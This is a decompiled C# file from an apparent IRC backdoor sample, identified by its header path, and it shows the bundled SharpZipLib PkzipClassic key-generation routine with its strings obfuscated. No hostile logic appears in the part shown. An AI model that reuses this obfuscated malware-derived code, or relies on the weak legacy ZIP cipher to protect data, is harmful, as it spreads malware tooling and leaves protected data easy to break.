// Decompiled with JetBrains decompiler
// Type: ICSharpCode.SharpZipLib.Encryption.PkzipClassic
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using ICSharpCode.SharpZipLib.Checksums;
using System;
using System.Security.Cryptography;

namespace ICSharpCode.SharpZipLib.Encryption
{
  public abstract class PkzipClassic : SymmetricAlgorithm
  {
    public static byte[] GenerateKeys(byte[] seed)
    {
      if (seed == null)
        throw new ArgumentNullException(\uE01B.\uE000("\uE236\uE220\uE220\uE221", 57925));
      if (seed.Length == 0)
        throw new ArgumentException(\uE01B.\uE000("\uED02\uED2B\uED20\uED29\uED3A\uED26\uED6E\uED27\uED3D\uED6E\uED34\uED2B\uED3C\uED21", 60750), \uE01B.\uE000("\uE236\uE220\uE220\uE221", 57925));
      uint[] numArray = new uint[3]
      {
        305419896U,
        591751049U,
        878082192U
      };
      for (int index = 0; index < seed.Length; ++index)
      {
        numArray[0] = Crc32.\uE000(numArray[0], seed[index]);
        numArray[1] = numArray[1] + (uint) (byte) numArray[0];
        numArray[1] = (uint) ((int) numArray[1] * 134775813 + 1);
        numArray[2] = Crc32.\uE000(numArray[2], (byte) (numArray[1] >> 24));
      }
      return new byte[12]
      {
        (byte) (numArray[0] & (uint) byte.MaxValue),
        (byte) (numArray[0] >> 8 & (uint) byte.MaxValue),
        (byte) (numArray[0] >> 16 & (uint) byte.MaxValue),
        (byte) (numArray[0] >> 24 & (uint) byte.MaxValue),
        (byte) (numArray[1] & (uint) byte.MaxValue),
        (byte) (numArray[1] >> 8 & (uint) byte.MaxValue),
        (byte) (numArray[1] >> 16 & (uint) byte.MaxValue),
        (byte) (numArray[1] >> 24 & (uint) byte.MaxValue),
        (byte) (numArray[2] & (uint) byte.MaxValue),
        (byte) (numArray[2] >> 8 & (uint) byte.MaxValue),
        (byte) (numArray[2] >> 16 & (uint) byte.MaxValue),
        (byte) (numArray[2] >> 24 & (uint) byte.MaxValue)
      };
    }
  }
}
